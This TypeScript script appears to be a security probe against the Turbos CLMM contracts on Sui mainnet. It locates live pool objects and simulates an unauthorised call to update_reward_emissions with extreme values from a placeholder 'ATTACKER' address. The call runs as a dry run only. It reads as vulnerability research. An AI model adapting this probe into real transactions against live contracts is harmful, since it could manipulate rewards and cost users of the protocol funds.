import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });
const TURBOS_CLMM = "0x91bfbc386a41afcfd9b2533058d7e915a1d3829089cc268ff4333d54d6339ca1";
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006";
const ATTACKER = "0x0000000000000000000000000000000000000000000000000000000000001337";

async function main() {
  // Get actual objects from recent transaction
  const txs = await client.queryTransactionBlocks({
    filter: { MoveFunction: { package: TURBOS_CLMM, module: "reward_manager" } },
    options: { showInput: true },
    limit: 3,
    order: "descending"
  });
  
  let poolObj = "";
  let versionObj = "";
  
  for (const tx of txs.data.slice(0, 1)) {
    const inp = (tx.transaction?.data?.transaction as any)?.inputs ?? [];
    for (let i = 0; i < inp.length; i++) {
      if (inp[i].type === "object") {
        const obj = await client.getObject({ id: inp[i].objectId, options: { showType: true } });
        const t = obj.data?.type ?? "";
        if (t.includes("::pool::Pool<")) poolObj = inp[i].objectId;
        if (t.includes("::pool::Version")) versionObj = inp[i].objectId;
      }
    }
  }
  
  console.log(`Pool: ${poolObj}`);
  console.log(`Version: ${versionObj}`);
  
  if (!poolObj || !versionObj) {
    console.log("Objects not found");
    return;
  }
  
  // Get Pool type to get type args
  const poolData = await client.getObject({ id: poolObj, options: { showType: true } });
  const poolType = poolData.data?.type ?? "";
  console.log(`Pool type: ${poolType}`);
  
  // Extract type args from Pool<T0, T1, T2>
  const typeMatch = poolType.match(/Pool<(.+)>$/);
  if (!typeMatch) { console.log("Cannot parse type args"); return; }
  
  // Simple split (may not work for nested generics)
  const typeArgs = typeMatch[1].split(", ").slice(0, 3);
  console.log(`Type args: ${typeArgs.join(", ")}`);
  
  // Test: update_reward_emissions with arbitrary sender  
  console.log("\n=== turbos::update_reward_emissions (non-auth) ===");
  try {
    const tx = new Transaction();
    tx.moveCall({
      package: TURBOS_CLMM,
      module: "reward_manager",
      function: "update_reward_emissions",
      typeArguments: typeArgs,
      arguments: [
        tx.object(poolObj),
        tx.pure.u64(999999999999),  // emissions per second - extreme value
        tx.pure.u128(999999999999n),
        tx.object(CLOCK),
        tx.object(versionObj),
      ]
    });
    
    const result = await client.devInspectTransactionBlock({
      sender: ATTACKER,
      transactionBlock: tx,
    });
    
    console.log(`Status: ${JSON.stringify(result.effects.status)}`);
    if (result.error) console.log(`Error: ${result.error.slice(0, 400)}`);
    if (result.events.length > 0) {
      for (const e of result.events) {
        console.log(`  Event: ${e.type.split("::").pop()}: ${JSON.stringify(e.parsedJson).slice(0, 150)}`);
      }
    }
  } catch(e: any) {
    const msg = e.message ?? String(e);
    const abortMatch = msg.match(/MoveAbort.*?}, (\d+)\)/);
    const abortCode = abortMatch ? `abort_code=${abortMatch[1]}` : "no_abort";
    console.log(`Threw [${abortCode}]: ${msg.slice(0, 300)}`);
  }
}

main().catch(console.error);
